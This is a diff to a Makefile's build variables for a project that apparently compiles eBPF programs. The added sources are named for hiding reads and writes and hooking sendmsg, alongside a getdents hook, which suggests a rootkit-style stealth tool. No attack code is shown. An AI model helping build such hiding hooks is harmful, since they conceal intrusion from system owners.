@@ -3,8 +3,8 @@ BPF_CLANG ?= clang
 BPF_CFLAGS ?= -O2 -g -target bpf -D__TARGET_ARCH_x86 -I/usr/include/ -I.
 BPF_LDFLAGS ?=
 ## BPF sources
-BPF_SRCS = bpf/xdp_redirect.c bpf/getdents.c bpf/hide_log.c
-BPF_OBJS = internal/core/ebpf/obj/xdp_redirect.o internal/core/ebpf/obj/getdents.o internal/core/ebpf/obj/hide_log.o
+BPF_SRCS = bpf/xdp_redirect.c bpf/getdents.c bpf/hide_write.c bpf/hide_read.c bpf/hook_sendmsg.c
+BPF_OBJS = internal/core/ebpf/obj/xdp_redirect.o internal/core/ebpf/obj/getdents.o internal/core/ebpf/obj/hide_write.o internal/core/ebpf/obj/hide_read.o internal/core/ebpf/obj/hook_sendmsg.o
 
 ## Go build variables
 GO ?= go
